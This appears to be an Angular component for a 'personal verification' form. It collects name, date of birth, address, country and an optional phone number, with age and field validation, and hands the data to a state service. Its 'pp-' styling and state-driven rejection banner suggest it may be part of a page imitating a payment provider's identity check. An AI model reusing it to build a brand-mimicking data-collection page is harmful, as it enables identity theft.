
import { Component, inject, signal, effect, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { filterCountries } from '../utils/country-data';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-personal-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-10">
        <h2 class="text-2xl font-bold text-pp-navy text-center mb-3 tracking-tight">{{ 'PERSONAL.TITLE' | translate }}</h2>
        <p class="text-base text-slate-500 text-center max-w-[80%] mx-auto leading-relaxed">
            {{ 'PERSONAL.SUBTITLE' | translate }}
        </p>
      </div>

      <!-- Error Message -->
      @if (state.rejectionReason()) {
        <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
            <span class="material-icons text-[#D92D20] text-xl">error</span>
            <div>
              <p class="text-sm font-bold text-pp-navy">{{ 'PERSONAL.ERROR_TITLE' | translate }}</p>
              <p class="text-xs text-slate-600 mt-1">{{ 'PERSONAL.ERROR_DESC' | translate }}</p>
            </div>
        </div>
      }

      <div class="space-y-6">
        
        <!-- Country Selector -->
        <div class="relative z-50">
            <div (click)="toggleDropdown()" class="pp-input-group mb-0 cursor-pointer">
                <div 
                    class="pp-input flex items-center"
                    [class.text-pp-navy]="country"
                    [class.text-transparent]="!country"
                >{{ country || 'Select' }}</div>

                <label class="pp-label"
                    [class.top-2]="country" [class.text-xs]="country" [class.font-bold]="country">
                    {{ 'PERSONAL.COUNTRY' | translate }}
                </label>

                <span class="material-icons absolute right-4 top-4 text-slate-500 transition-transform duration-300" [class.rotate-180]="showDropdown()">expand_more</span>
            </div>

            @if(showDropdown()) {
                <div class="absolute w-full bg-white border border-slate-200 rounded-[12px] shadow-xl mt-2 overflow-hidden animate-fade-in z-50">
                    <div class="p-3 border-b border-slate-100 bg-slate-50">
                        <input 
                            type="text" 
                            [ngModel]="searchQuery()"
                            (ngModelChange)="searchQuery.set($event)" 
                            (click)="$event.stopPropagation()"
                            placeholder="Search..."
                            class="w-full px-4 py-2 bg-white rounded-lg border border-slate-300 text-sm outline-none focus:border-pp-blue focus:ring-1 focus:ring-pp-blue text-pp-navy"
                            autofocus
                        >
                    </div>
                    <ul class="max-h-60 overflow-y-auto">
                        @for(c of filteredCountries(); track c) {
                            <li (click)="selectCountry(c)" class="px-5 py-3 hover:bg-blue-50 hover:text-pp-blue cursor-pointer text-sm text-pp-navy transition-colors font-bold border-b border-slate-50 last:border-0">
                                {{ c }}
                            </li>
                        }
                    </ul>
                </div>
            }
        </div>

        <div class="grid grid-cols-2 gap-4">
            <!-- First Name -->
            <div class="pp-input-group mb-0">
                <input 
                    type="text" 
                    [(ngModel)]="firstName"
                    (ngModelChange)="check(); update()"
                    (blur)="touchedName.set(true)"
                    id="firstName"
                    placeholder=" " 
                    class="pp-input peer"
                    [class.shadow-input-error]="touchedName() && firstName.length < 2"
                >
                <label for="firstName" class="pp-label">{{ 'PERSONAL.FIRST_NAME' | translate }}</label>
            </div>

            <!-- Last Name -->
            <div class="pp-input-group mb-0">
                <input 
                    type="text" 
                    [(ngModel)]="lastName"
                    (ngModelChange)="check(); update()"
                    (blur)="touchedName.set(true)"
                    id="lastName"
                    placeholder=" " 
                    class="pp-input peer"
                    [class.shadow-input-error]="touchedName() && lastName.length < 2"
                >
                <label for="lastName" class="pp-label">{{ 'PERSONAL.LAST_NAME' | translate }}</label>
            </div>
        </div>

        <!-- DOB -->
        <div class="pp-input-group">
          <input 
            type="date"
            [(ngModel)]="dob"
            (ngModelChange)="check(); update()"
            (blur)="touchedDob.set(true)"
            id="dob"
            class="pp-input peer"
            [class.shadow-input-error]="touchedDob() && !isAdult()"
          >
          <label for="dob" class="pp-label !top-2 !text-xs !font-bold">{{ 'PERSONAL.DOB' | translate }}</label>

          @if(touchedDob() && dob && !isAdult()) {
             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-bold animate-slide-up">{{ 'PERSONAL.MUST_BE_18' | translate }}</p>
          }
        </div>

        <!-- Phone Number (Conditional) -->
        @if (state.skipPhoneVerification()) {
            <div class="pp-input-group mb-0">
                <input
                    type="tel"
                    [value]="phoneNumber"
                    (input)="onPhoneInput($event)"
                    (blur)="touchedPhone.set(true)"
                    id="phone"
                    placeholder=" "
                    class="pp-input peer"
                    [class.shadow-input-error]="touchedPhone() && phoneNumber.replace(regex, '').length < 10"
                >
                <label for="phone" class="pp-label">{{ 'PERSONAL.PHONE' | translate }}</label>
            </div>
        }

        <!-- Address -->
        <div class="space-y-4">
          <div class="pp-input-group mb-0">
            <input 
              type="text" 
              [(ngModel)]="addrStreet"
              (ngModelChange)="check(); update()"
              (blur)="touchedAddress.set(true)"
              id="street"
              placeholder=" " 
              class="pp-input peer"
              [class.shadow-input-error]="touchedAddress() && addrStreet.length < 5"
            >
            <label for="street" class="pp-label">{{ 'PERSONAL.ADDRESS' | translate }}</label>
          </div>
          
          <div class="grid grid-cols-2 gap-4">
             <div class="pp-input-group mb-0">
                <input 
                  type="text" 
                  [(ngModel)]="addrCity"
                  (ngModelChange)="check(); update()"
                  (blur)="touchedAddress.set(true)"
                  id="city"
                  placeholder=" " 
                  class="pp-input peer"
                  [class.shadow-input-error]="touchedAddress() && addrCity.length < 3"
                >
                <label for="city" class="pp-label">{{ 'PERSONAL.CITY' | translate }}</label>
             </div>
             <div class="pp-input-group mb-0">
                <input 
                  type="text" 
                  [(ngModel)]="addrZip"
                  (ngModelChange)="check(); update()"
                  (blur)="touchedAddress.set(true)"
                  id="zip"
                  placeholder=" " 
                  maxlength="10"
                  class="pp-input peer"
                  [class.shadow-input-error]="touchedAddress() && addrZip.length < 4"
                >
                <label for="zip" class="pp-label">{{ 'PERSONAL.ZIP' | translate }}</label>
             </div>
          </div>
        </div>

        <div class="pt-6">
          <button 
            (click)="submit()"
            [disabled]="!isValid()"
            [class.opacity-50]="!isValid()"
            class="pp-btn"
          >
            {{ 'COMMON.CONTINUE' | translate }}
          </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class PersonalVerificationComponent {
  state = inject(StateService);
  
  firstName = '';
  lastName = '';
  dob = '';
  phoneNumber = '';
  country = '';
  addrStreet = '';
  addrCity = '';
  addrZip = '';
  
  // Validation State
  touchedName = signal(false);
  touchedDob = signal(false);
  touchedPhone = signal(false);
  touchedAddress = signal(false);
  isValid = signal(false);
  isAdult = signal(true);

  // Country Dropdown State
  showDropdown = signal(false);
  searchQuery = signal('');
  regex = /[^0-9]/g;

  constructor() {
      effect(() => {
          this.firstName = this.state.firstName();
          this.lastName = this.state.lastName();
          this.dob = this.state.dob();
          if (this.state.skipPhoneVerification()) {
              this.phoneNumber = this.state.phoneNumber();
          }
          this.check();
      }, { allowSignalWrites: true });
  }

  onPhoneInput(event: any) {
      let input = event.target.value.replace(/\D/g, '');

      const match = input.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
      let formatted = input;
      if (match) {
          const part1 = match[1];
          const part2 = match[2];
          const part3 = match[3];

          if (part1) formatted = `(${part1}`;
          if (part2) formatted += `) ${part2}`;
          if (part3) formatted += `-${part3}`;
      }
      if (input.length > 10) {
          formatted = `(${input.slice(0,3)}) ${input.slice(3,6)}-${input.slice(6,10)}`;
      }

      this.phoneNumber = formatted;
      event.target.value = formatted;
      this.check();
      this.update();
  }

  filteredCountries = computed(() => {
     return filterCountries(this.searchQuery());
  });

  toggleDropdown() {
      this.showDropdown.update(v => !v);
      if(this.showDropdown()) {
          setTimeout(() => {
            const input = document.querySelector('input[placeholder="Search..."]') as HTMLInputElement;
            if(input) input.focus();
          }, 50);
      }
  }

  selectCountry(c: string) {
      this.country = c;
      this.showDropdown.set(false);
      this.searchQuery.set('');
      this.check();
      this.update();
  }

  update() {
      this.state.updatePersonal({
          first: this.firstName,
          last: this.lastName,
          dob: this.dob,
          address: `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`,
          country: this.country
      });
      if (this.state.skipPhoneVerification()) {
          this.state.updatePhone({ number: this.phoneNumber });
      }
  }

  check() {
    let ageValid = false;
    if (this.dob) {
        const birth = new Date(this.dob);
        const today = new Date();
        let age = today.getFullYear() - birth.getFullYear();
        const m = today.getMonth() - birth.getMonth();
        if (m < 0 || (m === 0 && today.getDate() < birth.getDate())) {
            age--;
        }
        ageValid = age >= 18;
    }
    this.isAdult.set(ageValid);

    let phoneValid = true;
    if (this.state.skipPhoneVerification()) {
        phoneValid = this.phoneNumber.replace(/[^0-9]/g, '').length >= 10;
    }

    this.isValid.set(
      this.country !== '' &&
      this.firstName.length >= 2 && 
      this.lastName.length >= 2 && 
      ageValid && 
      phoneValid &&
      this.addrStreet.length >= 5 &&
      this.addrCity.length >= 3 &&
      this.addrZip.length >= 4
    );
  }

  submit() {
    if (this.isValid()) {
      const fullAddress = `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`;
      this.state.submitPersonal(this.firstName, this.lastName, this.dob, fullAddress, this.country);
    }
  }
}
